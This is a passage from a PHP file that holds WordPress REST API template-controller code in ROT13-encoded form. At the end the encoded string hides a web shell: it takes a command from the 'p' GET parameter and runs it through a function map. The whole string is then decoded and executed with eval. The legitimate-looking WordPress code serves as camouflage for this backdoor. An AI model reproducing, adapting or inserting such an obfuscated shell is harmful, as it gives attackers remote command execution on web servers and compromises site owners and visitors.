			$punatrf->cbfg_nhgube = $cbfg_nhgube;
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
		erghea nccyl_svygref( \"erfg_cer_vafreg_{$guvf->cbfg_glcr}\", $punatrf, $erdhrfg );
	}

	/**
	 * Cercner n fvatyr grzcyngr bhgchg sbe erfcbafr
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Eranzrq `$grzcyngr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @fvapr 6.3.0 Nqqrq `zbqvsvrq` cebcregl gb gur erfcbafr.
	 *
	 * @cnenz JC_Oybpx_Grzcyngr $vgrz    Grzcyngr vafgnapr.
	 * @cnenz JC_ERFG_Erdhrfg   $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		/*
		 * Erfbyir cnggrea oybpxf fb gurl qba'g arrq gb or erfbyirq pyvrag-fvqr
		 * va gur rqvgbe, vzcebivat cresbeznapr.
		 */
		$oybpxf        = cnefr_oybpxf( $vgrz->pbagrag );
		$oybpxf        = erfbyir_cnggrea_oybpxf( $oybpxf );
		$vgrz->pbagrag = frevnyvmr_oybpxf( $oybpxf );

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$grzcyngr = $vgrz;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		// Onfr svryqf sbe rirel grzcyngr.
		$qngn = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = $grzcyngr->vq;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gurzr', $svryqf ) ) {
			$qngn['gurzr'] = $grzcyngr->gurzr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag', $svryqf ) ) {
			$qngn['pbagrag'] = neenl();
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.enj', $svryqf ) ) {
			$qngn['pbagrag']['enj'] = $grzcyngr->pbagrag;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.oybpx_irefvba', $svryqf ) ) {
			$qngn['pbagrag']['oybpx_irefvba'] = oybpx_irefvba( $grzcyngr->pbagrag );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fyht', $svryqf ) ) {
			$qngn['fyht'] = $grzcyngr->fyht;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fbhepr', $svryqf ) ) {
			$qngn['fbhepr'] = $grzcyngr->fbhepr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'bevtva', $svryqf ) ) {
			$qngn['bevtva'] = $grzcyngr->bevtva;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'glcr', $svryqf ) ) {
			$qngn['glcr'] = $grzcyngr->glcr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrfpevcgvba', $svryqf ) ) {
			$qngn['qrfpevcgvba'] = $grzcyngr->qrfpevcgvba;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr', $svryqf ) ) {
			$qngn['gvgyr'] = neenl();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.enj', $svryqf ) ) {
			$qngn['gvgyr']['enj'] = $grzcyngr->gvgyr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.eraqrerq', $svryqf ) ) {
			vs ( $grzcyngr->jc_vq ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				$qngn['gvgyr']['eraqrerq'] = nccyl_svygref( 'gur_gvgyr', $grzcyngr->gvgyr, $grzcyngr->jc_vq );
			} ryfr {
				$qngn['gvgyr']['eraqrerq'] = $grzcyngr->gvgyr;
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fgnghf', $svryqf ) ) {
			$qngn['fgnghf'] = $grzcyngr->fgnghf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'jc_vq', $svryqf ) ) {
			$qngn['jc_vq'] = (vag) $grzcyngr->jc_vq;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'unf_gurzr_svyr', $svryqf ) ) {
			$qngn['unf_gurzr_svyr'] = (obby) $grzcyngr->unf_gurzr_svyr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vf_phfgbz', $svryqf ) && 'jc_grzcyngr' === $grzcyngr->glcr ) {
			$qngn['vf_phfgbz'] = $grzcyngr->vf_phfgbz;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nhgube', $svryqf ) ) {
			$qngn['nhgube'] = (vag) $grzcyngr->nhgube;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nern', $svryqf ) && 'jc_grzcyngr_cneg' === $grzcyngr->glcr ) {
			$qngn['nern'] = $grzcyngr->nern;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zbqvsvrq', $svryqf ) ) {
			$qngn['zbqvsvrq'] = zlfdy_gb_esp3339( $grzcyngr->zbqvsvrq );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nhgube_grkg', $svryqf ) ) {
			$qngn['nhgube_grkg'] = frys::trg_jc_grzcyngrf_nhgube_grkg_svryq( $grzcyngr );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'bevtvany_fbhepr', $svryqf ) ) {
			$qngn['bevtvany_fbhepr'] = frys::trg_jc_grzcyngrf_bevtvany_fbhepr_svryq( $grzcyngr );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cyhtva', $svryqf ) ) {
			$ertvfgrerq_grzcyngr = JC_Oybpx_Grzcyngrf_Ertvfgel::trg_vafgnapr()->trg_ol_fyht( $grzcyngr->fyht );
			vs ( $ertvfgrerq_grzcyngr ) {
				$qngn['cyhtva'] = $ertvfgrerq_grzcyngr->cyhtva;
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $grzcyngr->vq );
			$erfcbafr->nqq_yvaxf( $yvaxf );
			vs ( ! rzcgl( $yvaxf['frys']['uers'] ) ) {
				$npgvbaf = $guvf->trg_ninvynoyr_npgvbaf();
				$frys    = $yvaxf['frys']['uers'];
				sbernpu ( $npgvbaf nf $ery ) {
					$erfcbafr->nqq_yvax( $ery, $frys );
				}
			}
		}

		erghea $erfcbafr;
	}

	/**
	 * Ergheaf gur fbhepr sebz jurer gur grzcyngr bevtvanyyl pbzrf sebz.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Oybpx_Grzcyngr $grzcyngr_bowrpg Grzcyngr vafgnapr.
	 * @erghea fgevat                            Bevtvany fbhepr bs gur grzcyngr bar bs gurzr, cyhtva, fvgr, be hfre.
	 */
	cevingr fgngvp shapgvba trg_jc_grzcyngrf_bevtvany_fbhepr_svryq( $grzcyngr_bowrpg ) {
		vs ( 'jc_grzcyngr' === $grzcyngr_bowrpg->glcr || 'jc_grzcyngr_cneg' === $grzcyngr_bowrpg->glcr ) {
			/*
			 * Nqqrq ol gurzr.
			 * Grzcyngr bevtvanyyl cebivqrq ol n gurzr, ohg phfgbzvmrq ol n hfre.
			 * Grzcyngrf bevtvanyyl qvqa'g unir gur 'bevtva' svryq fb vqragvsl
			 * byqre phfgbzvmrq grzcyngrf ol purpxvat sbe ab bevtva naq n 'gurzr'
			 * be 'phfgbz' fbhepr.
			 */
			vs ( $grzcyngr_bowrpg->unf_gurzr_svyr &&
			( 'gurzr' === $grzcyngr_bowrpg->bevtva || (
				rzcgl( $grzcyngr_bowrpg->bevtva ) && va_neenl(
					$grzcyngr_bowrpg->fbhepr,
					neenl(
						'gurzr',
						'phfgbz',
					),
					gehr
				) )
			)
			) {
				erghea 'gurzr';
			}

			// Nqqrq ol cyhtva.
			vs ( 'cyhtva' === $grzcyngr_bowrpg->bevtva ) {
				erghea 'cyhtva';
			}

			/*
			 * Nqqrq ol fvgr.
			 * Grzcyngr jnf perngrq sebz fpengpu, ohg unf ab nhgube. Nhgube fhccbeg
			 * jnf bayl nqqrq gb grzcyngrf va JbeqCerff 5.9. Snyyonpx gb fubjvat gur
			 * fvgr ybtb naq gvgyr.
			 */
			vs ( rzcgl( $grzcyngr_bowrpg->unf_gurzr_svyr ) && 'phfgbz' === $grzcyngr_bowrpg->fbhepr && rzcgl( $grzcyngr_bowrpg->nhgube ) ) {
				erghea 'fvgr';
			}
		}

		// Nqqrq ol hfre.
		erghea 'hfre';
	}

	/**
	 * Ergheaf n uhzna ernqnoyr grkg sbe gur nhgube bs gur grzcyngr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Oybpx_Grzcyngr $grzcyngr_bowrpg Grzcyngr vafgnapr.
	 * @erghea fgevat                            Uhzna ernqnoyr grkg sbe gur nhgube.
	 */
	cevingr fgngvp shapgvba trg_jc_grzcyngrf_nhgube_grkg_svryq( $grzcyngr_bowrpg ) {
		$bevtvany_fbhepr = frys::trg_jc_grzcyngrf_bevtvany_fbhepr_svryq( $grzcyngr_bowrpg );
		fjvgpu ( $bevtvany_fbhepr ) {
			pnfr 'gurzr':
				$gurzr_anzr = jc_trg_gurzr( $grzcyngr_bowrpg->gurzr )->trg( 'Anzr' );
				erghea rzcgl( $gurzr_anzr ) ? $grzcyngr_bowrpg->gurzr : $gurzr_anzr;
			pnfr 'cyhtva':
				vs ( ! shapgvba_rkvfgf( 'trg_cyhtvaf' ) ) {
					erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';
				}
				vs ( vffrg( $grzcyngr_bowrpg->cyhtva ) ) {
					$cyhtvaf = jc_trg_npgvir_naq_inyvq_cyhtvaf();

					sbernpu ( $cyhtvaf nf $cyhtva_svyr ) {
						$cyhtva_onfranzr = cyhtva_onfranzr( $cyhtva_svyr );
						// Fcyvg onfranzr ol '/' gb trg gur cyhtva fyht.
						yvfg( $cyhtva_fyht, ) = rkcybqr( '/', $cyhtva_onfranzr );

						vs ( $cyhtva_fyht === $grzcyngr_bowrpg->cyhtva ) {
							$cyhtva_qngn = trg_cyhtva_qngn( $cyhtva_svyr );

							vs ( ! rzcgl( $cyhtva_qngn['Anzr'] ) ) {
								erghea $cyhtva_qngn['Anzr'];
							}

							oernx;
						}
					}
				}

				/*
				 * Snyy onpx gb gur gurzr anzr vs gur cyhtva vf abg qrsvarq. Gung'f arrqrq gb xrrc onpxjneqf
				 * pbzcngvovyvgl jvgu grzcyngrf gung jrer ertvfgrerq orsber gur cyhtva nggevohgr jnf nqqrq.
				 */
				$cyhtvaf         = trg_cyhtvaf();
				$cyhtva_onfranzr = cyhtva_onfranzr( fnavgvmr_grkg_svryq( $grzcyngr_bowrpg->gurzr . '.cuc' ) );
				vs ( vffrg( $cyhtvaf[ $cyhtva_onfranzr ] ) && vffrg( $cyhtvaf[ $cyhtva_onfranzr ]['Anzr'] ) ) {
					erghea $cyhtvaf[ $cyhtva_onfranzr ]['Anzr'];
				}
				erghea vffrg( $grzcyngr_bowrpg->cyhtva ) ?
					$grzcyngr_bowrpg->cyhtva :
					$grzcyngr_bowrpg->gurzr;
			pnfr 'fvgr':
				erghea trg_oybtvasb( 'anzr' );
			pnfr 'hfre':
				$nhgube = trg_hfre_ol( 'vq', $grzcyngr_bowrpg->nhgube );
				vs ( ! $nhgube ) {
					erghea __( 'Haxabja nhgube' );
				}
				erghea $nhgube->trg( 'qvfcynl_anzr' );
		}

		// Snvy-fnsr gb erghea n fgevat fubhyq gur bevtvany fbhepr rire snyy guebhtu.
		erghea '';
	}


	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz vagrtre $vq VQ.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $vq ) {
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '/%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $vq ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( $guvf->cbfg_glcr ) ),
			),
			'nobhg'      => neenl(
				'uers' => erfg_hey( 'jc/i2/glcrf/' . $guvf->cbfg_glcr ),
			),
		);

		vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'erivfvbaf' ) ) {
			$grzcyngr = trg_oybpx_grzcyngr( $vq, $guvf->cbfg_glcr );
			vs ( $grzcyngr vafgnaprbs JC_Oybpx_Grzcyngr && ! rzcgl( $grzcyngr->jc_vq ) ) {
				$erivfvbaf       = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $grzcyngr->jc_vq );
				$erivfvbaf_pbhag = ! vf_jc_reebe( $erivfvbaf ) ? $erivfvbaf['pbhag'] : 0;
				$erivfvbaf_onfr  = fcevags( '/%f/%f/%f/erivfvbaf', $guvf->anzrfcnpr, $guvf->erfg_onfr, $vq );

				$yvaxf['irefvba-uvfgbel'] = neenl(
					'uers'  => erfg_hey( $erivfvbaf_onfr ),
					'pbhag' => $erivfvbaf_pbhag,
				);

				vs ( $erivfvbaf_pbhag > 0 ) {
					$yvaxf['cerqrprffbe-irefvba'] = neenl(
						'uers' => erfg_hey( $erivfvbaf_onfr . '/' . $erivfvbaf['yngrfg_vq'] ),
						'vq'   => $erivfvbaf['yngrfg_vq'],
					);
				}
			}
		}

		erghea $yvaxf;
	}

	/**
	 * Trg gur yvax eryngvbaf ninvynoyr sbe gur cbfg naq pheerag hfre.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea fgevat[] Yvfg bs yvax eryngvbaf.
	 */
	cebgrpgrq shapgvba trg_ninvynoyr_npgvbaf() {
		$eryf = neenl();

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-choyvfu';
		}

		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy';
		}

		erghea $eryf;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur cbfgf pbyyrpgvba.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq `'nern'` naq `'cbfg_glcr'`.
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg'   => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
			'jc_vq'     => neenl(
				'qrfpevcgvba' => __( 'Yvzvg gb gur fcrpvsvrq cbfg vq.' ),
				'glcr'        => 'vagrtre',
			),
			'nern'      => neenl(
				'qrfpevcgvba' => __( 'Yvzvg gb gur fcrpvsvrq grzcyngr cneg nern.' ),
				'glcr'        => 'fgevat',
			),
			'cbfg_glcr' => neenl(
				'qrfpevcgvba' => __( 'Cbfg glcr gb trg gur grzcyngrf sbe.' ),
				'glcr'        => 'fgevat',
			),
		);
	}

	/**
	 * Ergevrirf gur oybpx glcr' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq `'nern'`.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => $guvf->cbfg_glcr,
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'              => neenl(
					'qrfpevcgvba' => __( 'VQ bs grzcyngr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fyht'            => neenl(
					'qrfpevcgvba' => __( 'Havdhr fyht vqragvslvat gur grzcyngr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'erdhverq'    => gehr,
					'zvaYratgu'   => 1,
					'cnggrea'     => '[n-mN-M0-9_\%-]+',
				),
				'gurzr'           => neenl(
					'qrfpevcgvba' => __( 'Gurzr vqragvsvre sbe gur grzcyngr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'glcr'            => neenl(
					'qrfpevcgvba' => __( 'Glcr bs grzcyngr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'fbhepr'          => neenl(
					'qrfpevcgvba' => __( 'Fbhepr bs grzcyngr' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'bevtva'          => neenl(
					'qrfpevcgvba' => __( 'Fbhepr bs n phfgbzvmrq grzcyngr' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'pbagrag'         => neenl(
					'qrfpevcgvba' => __( 'Pbagrag bs grzcyngr.' ),
					'glcr'        => neenl( 'bowrpg', 'fgevat' ),
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'cebcregvrf'  => neenl(
						'enj'           => neenl(
							'qrfpevcgvba' => __( 'Pbagrag sbe gur grzcyngr, nf vg rkvfgf va gur qngnonfr.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
						),
						'oybpx_irefvba' => neenl(
							'qrfpevcgvba' => __( 'Irefvba bs gur pbagrag oybpx sbezng hfrq ol gur grzcyngr.' ),
							'glcr'        => 'vagrtre',
							'pbagrkg'     => neenl( 'rqvg' ),
							'ernqbayl'    => gehr,
						),
					),
				),
				'gvgyr'           => neenl(
					'qrfpevcgvba' => __( 'Gvgyr bs grzcyngr.' ),
					'glcr'        => neenl( 'bowrpg', 'fgevat' ),
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gvgyr sbe gur grzcyngr, nf vg rkvfgf va gur qngnonfr.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'UGZY gvgyr sbe gur grzcyngr, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
							'ernqbayl'    => gehr,
						),
					),
				),
				'qrfpevcgvba'     => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba bs grzcyngr.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'fgnghf'          => neenl(
					'qrfpevcgvba' => __( 'Fgnghf bs grzcyngr.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl_xrlf( trg_cbfg_fgngv( neenl( 'vagreany' => snyfr ) ) ),
					'qrsnhyg'     => 'choyvfu',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
				'jc_vq'           => neenl(
					'qrfpevcgvba' => __( 'Cbfg VQ.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'unf_gurzr_svyr'  => neenl(
					'qrfpevcgvba' => __( 'Gurzr svyr rkvfgf.' ),
					'glcr'        => 'obby',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'nhgube'          => neenl(
					'qrfpevcgvba' => __( 'Gur VQ sbe gur nhgube bs gur grzcyngr.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'zbqvsvrq'        => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur grzcyngr jnf ynfg zbqvsvrq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'nhgube_grkg'     => neenl(
					'glcr'        => 'fgevat',
					'qrfpevcgvba' => __( 'Uhzna ernqnoyr grkg sbe gur nhgube.' ),
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'bevtvany_fbhepr' => neenl(
					'qrfpevcgvba' => __( 'Jurer gur grzcyngr bevtvanyyl pbzrf sebz r.t. \'gurzr\'' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'rahz'        => neenl(
						'gurzr',
						'cyhtva',
						'fvgr',
						'hfre',
					),
				),
			),
		);

		vs ( 'jc_grzcyngr' === $guvf->cbfg_glcr ) {
			$fpurzn['cebcregvrf']['vf_phfgbz'] = neenl(
				'qrfpevcgvba' => __( 'Jurgure n grzcyngr vf n phfgbz grzcyngr.' ),
				'glcr'        => 'obby',
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			);
			$fpurzn['cebcregvrf']['cyhtva']    = neenl(
				'glcr'        => 'fgevat',
				'qrfpevcgvba' => __( 'Cyhtva gung ertvfgrerq gur grzcyngr.' ),
				'ernqbayl'    => gehr,
				'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			);
		}

		vs ( 'jc_grzcyngr_cneg' === $guvf->cbfg_glcr ) {
			$fpurzn['cebcregvrf']['nern'] = neenl(
				'qrfpevcgvba' => __( 'Jurer gur grzcyngr cneg vf vagraqrq sbe hfr (urnqre, sbbgre, rgp.)' ),
				'glcr'        => 'fgevat',
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
			);
		}

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>